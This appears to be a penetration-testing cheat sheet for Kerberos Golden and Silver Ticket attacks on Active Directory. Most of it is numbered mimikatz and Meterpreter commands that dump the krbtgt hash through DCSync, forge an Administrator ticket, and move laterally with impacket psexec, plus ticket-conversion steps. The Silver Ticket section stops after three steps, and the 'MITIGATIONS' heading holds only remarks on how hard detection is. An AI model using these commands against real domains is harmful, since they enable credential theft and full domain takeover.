# GOLDEN TICKET

## Dump krbtgt hash to own the entire domain!

#### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::lsa /inject /name:krbtgt

#### 4) lsadump::lsa /patch

#### 5) lsadump::trust /patch

#### 6) lsadump::dcsync /user:krbtgt

#### 7) kerberos::purge

#### 8) kerberos::golden /user:Administrator /domain:domain.local /sid:SID /krbtgt:NTLM HASH /id:500(Admin) or 1103(Service)

#### 9) kerberos::tgt

#### 10) misc::cmd

## Alternate method: Meterpreter shell

### Get information for golden ticket

#### 1) dcsync_ntlm krbtgt

#### 2) dcsync krbtgt

### Forge a Golden Ticket

#### 3) load kiwi

#### 4) golden_ticket_create -d DOMAIN_NAME -k NTLM_HASH_OF_KRBTGT -s SID -u Administrator

#### 5) kerberos_ticket_purge

#### 6) kerberos_ticket_use /root/Downloads/Administrator.tck

#### 7) kerberos_ticket_list

### Authenticate with psexec impacket (Linux)

#### 8) ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100

# SILVER TICKET

#### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::lsa /inject /name:SERVICE/DOMAIN ADMIN


# Golden Ticket

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `lsadump::dcsync /domain:eagle.local /user:krbtgt`           | Command used in `mimikatz` to DCSync and dump the `krbtgt` password hash |
| `Get-DomainSID`                                              | Cmdlet from `PowerView` used to obtain the SID value of the domain. |
| `golden /domain:eagle.local /sid:<domain sid> /rc4:<rc4 hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt` | Command used in `mimikatz` to forge a golden ticket for the `Administrator` account and pass the ticket to the current session |
| `klist`                                                      | Command line utility in Windows to display the contents of the Kerberos ticket cache. |


## TIP: If you need to swap ticket between Windows and Linux, you need to convert them with ticket_converter or kekeo .

### 1) Kekeo

 - misc::convert ccache ticket.kirbi

 - misc::convert kirbi ticket.ccache

### 2) Impacket ticket_converter

 - python ticket_converter.py velociraptor.ccache velociraptor.kirbi

 - python ticket_converter.py velociraptor.kirbi velociraptor.ccache

## MITIGATIONS

### 1) Hard to detect because they are legit TGT tickets

### 2) Mimikatz generates a golden ticket with a life-span of 10 years
